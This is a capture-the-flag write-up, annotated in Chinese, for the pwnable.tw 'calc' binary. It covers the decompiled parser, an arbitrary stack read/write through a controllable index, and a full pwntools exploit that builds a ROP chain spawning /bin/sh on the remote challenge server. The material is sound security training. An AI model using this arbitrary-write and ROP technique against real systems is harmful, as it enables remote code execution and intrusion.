# calc

```
[*] '/home/user/tw/calc'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```
user@vm-ubuntu20:~/tw$ ./calc 
=== Welcome to SECPROG calculator ===
1+1 
2
-0*7
prevent division by zero
4+(-1)
expression error!
+100
0
```

```c
unsigned int calc()
{
  int v1; // [esp+18h] [ebp-5A0h]
  int v2[100]; // [esp+1Ch] [ebp-59Ch]
  char s; // [esp+1ACh] [ebp-40Ch]
  unsigned int v4; // [esp+5ACh] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  while ( 1 )
  {
    bzero(&s, 0x400u);
    if ( !get_expr((int)&s, 1024) )
      break;
    init_pool(&v1);
    if ( parse_expr(&s, &v1) )
    {
      printf((const char *)&unk_80BF804, v2[v1 - 1]); //print result
      fflush(stdout);
    }
  }
  return __readgsdword(0x14u) ^ v4;
}

int __cdecl get_expr(int nn_stack_var, int nn_size)
{
  int v2; // eax
  char v4; // [esp+1Bh] [ebp-Dh]
  int nn_count; // [esp+1Ch] [ebp-Ch]

  nn_count = 0;
  while ( nn_count < nn_size && read(0, &v4, 1) != -1 && v4 != '\n' )
  {
    if ( v4 == '+' || v4 == '-' || v4 == '*' || v4 == '/' || v4 == '%' || v4 > '/' && v4 <= '9' )
    {
      v2 = nn_count++;
      *(_BYTE *)(nn_stack_var + v2) = v4;
    }
  }
  *(_BYTE *)(nn_count + nn_stack_var) = 0;
  return nn_count;
}
```


```c
_DWORD *__cdecl eval(_DWORD *a1, char nn_symbol)
{
  _DWORD *result; // eax

  if ( nn_symbol == '+' ) 
  {
    a1[*a1 - 1] += a1[*a1]; // a1[*a1 - 1] = a1[*a1 - 1] + a1[*a1]
  }
  else if ( nn_symbol > '+' )
  {
    if ( nn_symbol == '-' )
    {
      a1[*a1 - 1] -= a1[*a1];
    }
    else if ( nn_symbol == '/' )
    {
      a1[*a1 - 1] /= a1[*a1];
    }
  }
  else if ( nn_symbol == '*' )
  {
    a1[*a1 - 1] *= a1[*a1];
  }
  result = a1;
  --*a1;
  return result;
}
```


result[0]為讀取到的數字個數
result[1] [2]... 是要用算的數字
```
*a1 取 result[0]

任意讀 

+100

在判定時會 
symb +
num  100

由於只有一個數字所以 a1[*a1 - 1]=1

a1[*a1 - 1] = a1[0]= 1
a1[*a1] =  a1[1] = 100

a1[0] = a1[*a1 - 1] = a1[*a1 - 1] + a1[*a1]
a1[0] = a1[*a1 - 1] = 101

最後又會   
  result = a1;
  --*a1;  ====> a1[*a1 - 1]= a1[0] = 100
  return result; 


printf((const char *)&unk_80BF804, v2[v1 - 1]); //print result
                                    v2[100]

任意寫

+100+1

在判定時會
symb + +
num  100 1

同上，處理第二個symbol，a1[0]會加一

           a1[0] = 101
a1[*a1] =  a1[101] = 1

a1[*a1 - 1] = a1[*a1 - 1] + a1[*a1]
a1[100] = a1[100] +1        



漏洞出在 a1[index] ，index 可以被控制
```

可以任意寫，但是有nx，所以無法塞 shellcode，在 ret 塞入 rop

> ROPgadget --binary calc --ropchain

因為直接蓋 ret 所以不會碰到 canary

(0x5A0 +4 /4) = 361 ，從+361開始寫


```python=
from pwn import *
from struct import pack
# context.log_level = 'DEBUG'
context(log_level="debug")


p = b''
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec060) # @ .data
p += pack('<I', 0x0805c34b) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec064) # @ .data + 4
p += pack('<I', 0x0805c34b) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x080550d0) # xor eax, eax ; ret
p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481d1) # pop ebx ; ret
p += pack('<I', 0x080ec060) # @ .data
p += pack('<I', 0x080701d1) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x080ec060) # padding without overwrite ebx
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x080550d0) # xor eax, eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x08049a21) # int 0x80



r = remote('chall.pwnable.tw', 10100)
r.recv()

for i in range(len(p) // 4):
    r.sendline('+' + str(361 + i))
    recv = int(r.recv())  # read stack value

    payload = '+' + str(361+i)
    payload += '-' + str(recv)  # clear stack
    payload += '+' + str(u32(p [ i*4: i*4+4] ))
    r.sendline( payload )
    r.recv()

r.interactive()
```

> FLAG{C:\Windows\System32\calc.exe}